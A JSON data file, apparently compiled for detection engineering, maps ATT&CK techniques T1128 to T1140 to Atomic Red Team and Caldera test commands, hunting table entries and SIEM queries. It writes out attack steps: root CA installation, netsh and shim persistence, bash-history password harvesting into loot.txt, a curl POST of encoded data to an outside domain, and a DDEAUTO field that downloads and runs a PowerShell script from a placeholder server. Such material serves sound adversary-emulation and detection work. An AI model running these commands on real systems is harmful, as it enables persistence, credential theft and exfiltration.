"input_arguments": {"helper_file": {"description": "Path to DLL", "type": "Path", "default": "C:\\Path\\file.dll"}}, "executor": {"name": "command_prompt", "command": "netsh.exe add helper #{helper_file}\n"}}]}}, {"SysmonHunter - T1128": {"name": "Netsh Helper DLL", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\SOFTWARE\\Microsoft\\NetSh"}}}, {"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\netsh.exe"}, "cmdline": {"pattern": "add|helper", "op": "and"}}}]}}], "command_list": ["netsh.exe add helper C:\\Path\\file.dll\n", "\\SOFTWARE\\Microsoft\\NetSh", "\\\\Windows\\\\.+\\\\netsh.exeadd|helper"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"*\\\\SOFTWARE\\\\Microsoft\\\\Netsh\\\\*\"", "name": "Narsh Helper DLL Registry"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"netsh.exe\"and process_command_line contains \"*helper*\")", "name": "Netsh Helper DLL Process"}], "possible_detections": []}, {"technique_id": "T1130", "commands": [{"source": "atomics/T1130/T1130.yaml", "command": "openssl genrsa -out rootCA.key 4096\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le \"5\" ];\nthen\n  cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge \"7\" ];\n  cp rootCA.crt /etc/pki/ca-trust/source/anchors/\n  update-ca-trust\nfi\n", "name": null}, {"source": "atomics/T1130/T1130.yaml", "command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt\n\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le \"5\" ];\nthen\n  cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge \"7\" ];\n  cp rootCA.crt /etc/pki/ca-trust/source/anchors/\n  update-ca-trust\nfi\n", "name": null}, {"source": "atomics/T1130/T1130.yaml", "command": "mv #{cert_filename} /usr/local/share/ca-certificates\necho sudo update-ca-certificates\n", "name": null}, {"source": "atomics/T1130/T1130.yaml", "command": "mv rootCA.crt /usr/local/share/ca-certificates\necho sudo update-ca-certificates\n", "name": null}, {"source": "atomics/T1130/T1130.yaml", "command": "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"#{cert_filename}\"\n", "name": null}, {"source": "atomics/T1130/T1130.yaml", "command": "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"rootCA.crt\"\n", "name": null}, {"source": "atomics/T1130/T1130.yaml", "command": "$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Install Root Certificate": {"attack_technique": "T1130", "display_name": "Install Root Certificate", "atomic_tests": [{"name": "Install root CA on CentOS/RHEL", "description": "Creates a root CA with openssl\n", "supported_platforms": ["linux"], "input_arguments": {"key_filename": {"description": "Key we create that is used to create the CA certificate", "type": "Path", "default": "rootCA.key"}, "cert_filename": {"description": "Path of the CA certificate we create", "type": "Path", "default": "rootCA.crt"}}, "executor": {"name": "sh", "command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le \"5\" ];\nthen\n  cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge \"7\" ];\n  cp rootCA.crt /etc/pki/ca-trust/source/anchors/\n  update-ca-trust\nfi\n"}}, {"name": "Install root CA on Debian/Ubuntu", "description": "Creates a root CA with openssl\n", "supported_platforms": ["linux"], "input_arguments": {"key_filename": {"description": "Key we create that is used to create the CA certificate", "type": "Path", "default": "rootCA.key"}, "cert_filename": {"description": "CA file name", "type": "Path", "default": "rootCA.crt"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Verify the certificate exists. It generates if not on disk.\n", "prereq_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "mv #{cert_filename} /usr/local/share/ca-certificates\necho sudo update-ca-certificates\n"}}, {"name": "Install root CA on macOS", "description": "Creates a root CA with openssl\n", "supported_platforms": ["macos"], "input_arguments": {"key_filename": {"description": "Key we create that is used to create the CA certificate", "type": "Path", "default": "rootCA.key"}, "cert_filename": {"description": "CA file name", "type": "Path", "default": "rootCA.crt"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Verify the certificate exists. It generates if not on disk.\n", "prereq_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"#{cert_filename}\"\n"}}, {"name": "Install root CA on Windows", "description": "Creates a root CA with Powershell\n", "supported_platforms": ["windows"], "input_arguments": {"pfx_path": {"description": "Path of the certificate", "type": "Path", "default": "rootCA.cer"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Verify the certificate exists. It generates if not on disk.\n", "prereq_command": "if (Test-Path #{cert_filename}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$cert.Thumbprint -FilePath #{pfx_path}\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item        \n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n", "cleanup_command": "$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) | Remove-Item\n"}}]}}], "command_list": ["openssl genrsa -out rootCA.key 4096\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le \"5\" ];\nthen\n  cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge \"7\" ];\n  cp rootCA.crt /etc/pki/ca-trust/source/anchors/\n  update-ca-trust\nfi\n", "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt\n\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le \"5\" ];\nthen\n  cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge \"7\" ];\n  cp rootCA.crt /etc/pki/ca-trust/source/anchors/\n  update-ca-trust\nfi\n", "mv #{cert_filename} /usr/local/share/ca-certificates\necho sudo update-ca-certificates\n", "mv rootCA.crt /usr/local/share/ca-certificates\necho sudo update-ca-certificates\n", "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"#{cert_filename}\"\n", "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"rootCA.crt\"\n", "$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and process_path !contains \"svchost.exe\"and (registry_key_path contains \"*\\\\SOFTWARE\\\\Microsoft\\\\EnterpriseCertificates\\\\Root\\\\Certificates\\\\*\"or registry_key_path contains \"*\\\\Microsoft\\\\SystemCertificates\\\\Root\\\\Certificates\\\\*\")", "name": "Install Root Certificates"}], "possible_detections": []}, {"technique_id": "T1132", "commands": [{"source": "atomics/T1132/T1132.yaml", "command": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.redcanary.com\n", "name": null}, {"source": "atomics/T1132/T1132.yaml", "command": "echo -n 111-11-1111 | base64\ncurl -XPOST MTExLTExLTExMTE=.#{destination_url}\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Data Encoding": {"attack_technique": "T1132", "display_name": "Data Encoding", "atomic_tests": [{"name": "Base64 Encoded data.", "description": "Utilizing a common technique for posting base64 encoded data.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"destination_url": {"description": "Destination URL to post encoded data.", "type": "string", "default": "redcanary.com"}, "base64_data": {"description": "Encoded data to post using fake Social Security number 111-11-1111.", "type": "string", "default": "MTExLTExLTExMTE="}}, "executor": {"name": "sh", "command": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}\n"}}]}}], "command_list": ["echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.redcanary.com\n", "echo -n 111-11-1111 | base64\ncurl -XPOST MTExLTExLTExMTE=.#{destination_url}\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1137", "commands": [], "parsed_datasets": [{"Atomic Red Team Test - Office Application Startup": {"attack_technique": "T1137", "display_name": "Office Application Startup", "atomic_tests": [{"name": "DDEAUTO", "description": "\nTrustedSec - Unicorn - https://github.com/trustedsec/unicorn\n\nSensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nWord VBA Macro\n\n[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)\n", "supported_platforms": ["windows"], "executor": {"name": "manual", "steps": "1. Open Word\n\n2. Insert tab -> Quick Parts -> Field\n\n3. Choose = (Formula) and click ok.\n\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n\n5. Right-click the Field, choose \"Toggle Field Codes\"\n\n6. Paste in the code from Unicorn or SensePost\n\n7. Save the Word document.\n\n9. DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"\n\n10. DDEAUTO \"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # \" \"Microsoft Document Security Add-On\"\n"}}]}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1138", "commands": [{"source": "atomics/T1138/T1138.yaml", "command": "sdbinst.exe PathToAtomicsFolder\\T1138\\bin\\AtomicShimx86.sdb\n", "name": null}, {"source": "atomics/T1138/T1138.yaml", "command": "Copy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\T1138CompatDatabase.sdb\nCopy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\Custom64\\T1138CompatDatabase.sdb\n", "name": null}, {"source": "atomics/T1138/T1138.yaml", "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\n", "name": null}, {"source": "Threat Hunting Tables", "command": "*.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB", "name": "registry_path"}, {"source": "SysmonHunter - Application Shimming", "command": "sdbinst.exe\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB", "name": null}, {"source": "SysmonHunter - Application Shimming", "command": "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Application Shimming": {"attack_technique": "T1138", "display_name": "Application Shimming", "atomic_tests": [{"name": "Application Shim Installation", "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\T1138\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\T1138\\src directory.\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "Path to the shim database file", "type": "String", "default": "PathToAtomicsFolder\\T1138\\bin\\AtomicShimx86.sdb"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Shim database file must exist on disk at specified location (#{file_path})\n", "prereq_command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{file_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1138/bin/AtomicShimx86.sdb\" -OutFile \"#{file_path}\"\n"}, {"description": "AtomicTest.dll must exist at c:\\Tools\\AtomicTest.dll\n", "prereq_command": "if (Test-Path c:\\Tools\\AtomicTest.dll) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path c:\\Tools\\AtomicTest.dll) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1138/bin/AtomicTest.dll\" -OutFile c:\\Tools\\AtomicTest.dll\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "sdbinst.exe #{file_path}\n", "cleanup_command": "sdbinst.exe -u #{file_path}\n"}}, {"name": "New shim database files created in the default shim database directory", "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Copy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\T1138CompatDatabase.sdb\nCopy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\Custom64\\T1138CompatDatabase.sdb\n", "cleanup_command": "Remove-Item C:\\Windows\\apppatch\\Custom\\T1138CompatDatabase.sdb -ErrorAction Ignore\nRemove-Item C:\\Windows\\apppatch\\Custom\\Custom64\\T1138CompatDatabase.sdb -ErrorAction Ignore\n"}}, {"name": "Registry key creation and/or modification events for SDB", "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\n", "cleanup_command": "Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1138\" -ErrorAction Ignore\nRemove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1138\" -ErrorAction Ignore\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100182", "os": "windows", "parent_process": "*.exe", "commandline_string": "reg add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "application_shimming", "mitre_attack": "T1138", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100183", "os": "windows", "parent_process": "*.exe", "commandline_string": "reg add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "application_shimming", "mitre_attack": "T1138", "itw_sample": ""}}, {"SysmonHunter - T1138": {"name": "Application Shimming", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "process", "process": {"image": {"pattern": "sdbinst.exe"}, "cmdline": {"pattern": "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB"}}}, {"type": "reg", "reg": {"path": {"pattern": "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB"}}}]}}], "command_list": ["sdbinst.exe PathToAtomicsFolder\\T1138\\bin\\AtomicShimx86.sdb\n", "Copy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\T1138CompatDatabase.sdb\nCopy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\Custom64\\T1138CompatDatabase.sdb\n", "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\n", "*.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom", "*.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB", "sdbinst.exe\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB", "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 11and file_name contains \"C:\\\\Windows\\\\AppPatch\\\\Custom\\\\\"", "name": "Application Shimming FileAccess"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and process_path contains \"sdbinst.exe\"", "name": "Application Shimming Process"}, {"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\InstalledSDB\\\\\"", "name": "Application Shimming Registry"}], "possible_detections": [{"data_source": {"title": "Possible Shim Database Persistence via sdbinst.exe", "id": "517490a7-115a-48c6-8862-1a481504d5a8", "status": "experimental", "description": "Detects installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications.", "references": ["https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html"], "tags": ["attack.persistence", "attack.t1138"], "author": "Markus Neis", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\sdbinst.exe"], "CommandLine": ["*.sdb*"]}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}]}, {"technique_id": "T1139", "commands": [{"source": "atomics/T1139/T1139.yaml", "command": "cat ~/.bash_history | grep #{bash_history_grep_args} > #{output_file}\n", "name": null}, {"source": "atomics/T1139/T1139.yaml", "command": "cat #{bash_history_filename} | grep -e '-p ' -e 'pass' -e 'ssh' > #{output_file}\n", "name": null}, {"source": "atomics/T1139/T1139.yaml", "command": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > ~/loot.txt\n", "name": null}, {"source": "data/abilities/credential-access/422526ec-27e9-429a-995b-c686a29561a4.yml", "command": {"darwin": {"sh": {"command": "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}, "linux": {"sh": {"command": "cat ~/.bash_history", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}}, "name": "Get contents of bash history"}, {"source": "Threat Hunting Tables", "command": "bash cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot.txt", "name": null}, {"source": "Threat Hunting Tables", "command": "bash cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > out.txt", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/pillage_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/pillage_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/pillage_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/pillage_user", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "cat .bash_history | grep password > bash.txt", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Bash History": {"attack_technique": "T1139", "display_name": "Bash History", "atomic_tests": [{"name": "Search Through Bash History", "description": "Search through bash history for specifice commands we want to capture\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"bash_history_filename": {"description": "Path of the bash history file to capture", "type": "Path", "default": "~/.bash_history"}, "bash_history_grep_args": {"description": "grep arguments that filter out specific commands we want to capture", "type": "Path", "default": "-e '-p ' -e 'pass' -e 'ssh'"}, "output_file": {"description": "Path where captured results will be placed", "type": "Path", "default": "~/loot.txt"}}, "executor": {"name": "sh", "command": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}\n"}}]}}, {"Mitre Stockpile - Get contents of bash history": {"id": "422526ec-27e9-429a-995b-c686a29561a4", "name": "Dump history", "description": "Get contents of bash history", "tactic": "credential-access", "technique": {"attack_id": "T1139", "name": "Bash History"}, "platforms": {"darwin": {"sh": {"command": "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}, "linux": {"sh": {"command": "cat ~/.bash_history", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}}}}, {"Threat Hunting Tables": {"chain_id": "100190", "os": "mac", "parent_process": "bash", "commandline_string": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot.txt", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "bash_history", "mitre_attack": "T1139", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100201", "os": "linux", "parent_process": "bash", "commandline_string": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > out.txt", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "bash_history", "mitre_attack": "T1139", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/linux/pillage_user", "ATT&CK Technique #1": "T1139", "ATT&CK Technique #2": "T1212", "Technique": "Bash History", "Concatenate for Python Dictionary": "\"python/collection/linux/pillage_user\":  [\"T1139\",\"T1212\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/pillage_user", "ATT&CK Technique #1": "T1139", "ATT&CK Technique #2": "T1033", "Technique": "Bash History", "Concatenate for Python Dictionary": "\"python/collection/osx/pillage_user\":  [\"T1139\",\"T1033\"],"}}], "command_list": ["cat ~/.bash_history | grep #{bash_history_grep_args} > #{output_file}\n", "cat #{bash_history_filename} | grep -e '-p ' -e 'pass' -e 'ssh' > #{output_file}\n", "cat #{bash_history_filename} | grep #{bash_history_grep_args} > ~/loot.txt\n", {"darwin": {"sh": {"command": "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}, "linux": {"sh": {"command": "cat ~/.bash_history", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}}, "bash cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot.txt", "bash cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > out.txt", "python/collection/linux/pillage_user", "python/collection/linux/pillage_user", "python/collection/osx/pillage_user", "python/collection/osx/pillage_user", "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}", "cat .bash_history | grep password > bash.txt"], "attack_paths": [], "queries": [{"product": "Splunk", "query": "index=linux sourcetype=\"linux_audit\" syscall=257 key=bash_history_changes | table host,auid,syscall,syscall_name,exe", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history cat bash_history | table _time,host,user_name,bash_command", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}]}, {"technique_id": "T1140", "commands": [{"source": "atomics/T1140/T1140.yaml", "command": "certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n", "name": null}, {"source": "atomics/T1140/T1140.yaml", "command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n", "name": null}, {"source": "Threat Hunting Tables", "command": "certutil.exe -decode", "name": null}, {"source": "SysmonHunter - Deobfuscate/Decode Files or Information", "command": "certutil.exe-decode|-urlcache", "name": null}, {"source": "SysmonHunter - Deobfuscate/Decode Files or Information", "command": "certutil.exe|-decode|-urlcache", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Deobfuscate/Decode Files Or Information": {"attack_technique": "T1140", "display_name": "Deobfuscate/Decode Files Or Information", "atomic_tests": [{"name": "Deobfuscate/Decode Files Or Information", "description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp 